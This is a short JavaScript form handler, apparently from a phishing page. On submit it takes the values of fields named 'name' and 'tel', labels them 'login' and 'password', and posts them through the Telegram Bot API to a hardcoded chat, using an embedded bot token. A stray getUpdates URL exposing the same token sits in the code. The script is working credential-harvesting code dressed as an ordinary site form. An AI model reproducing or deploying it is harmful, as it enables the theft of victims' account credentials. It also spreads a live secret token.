const TOKEN = "5857275803:AAGd1DHgjOVHw8P3hXd9Vq9Cg_M6rRfXJSw"
const CHAT_ID = "1967752161"
const UPI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage `
const success =  document.getElementById("success")

https://api.telegram.org/bot5857275803:AAGd1DHgjOVHw8P3hXd9Vq9Cg_M6rRfXJSw/getupdates
document.getElementById("tg").addEventListener("submit", function (e) {
    e.preventDefault()
    console.log(this.radio.value)
    let message = `Заявка на сайт\n`;
    message += `login:  ${this.name.value}\n`;
    message += `password: ${this.tel.value}`;

    axios.post(UPI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message
    })
        .then((res) => {
            this.name.value = "";
            this.tel.value = "";
            // success.innerHTML = "отправельно!";
            success.style.display = "block";
        })
        .catch((err) => {
            console.warn(err)
        })
        .finally(() => {
            console.log("Успешно")
        })
})






